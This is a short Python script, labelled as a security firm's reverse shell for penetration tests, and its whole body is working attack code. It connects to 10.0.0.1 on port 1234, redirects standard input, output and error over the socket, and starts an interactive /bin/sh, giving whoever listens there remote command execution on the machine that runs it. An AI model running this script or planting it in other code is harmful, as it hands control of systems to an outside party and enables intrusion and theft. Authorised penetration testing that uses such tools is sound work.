#!/usr/bin/env python


#**************************************************************************#
#  Filename: py_rev_shel.py             (Created: 2016-08-18)              #
#                                       (Updated: XXXX-XX-XX)              #
#  Info:                                                                   #
#    TBG Security Python Reverse Shell for pentests                        #
#  Author:                                                                 #
#    Ryan Hays                                                             #
#**************************************************************************#

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1", 1234))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p=subprocess.call(["/bin/sh", "-i"])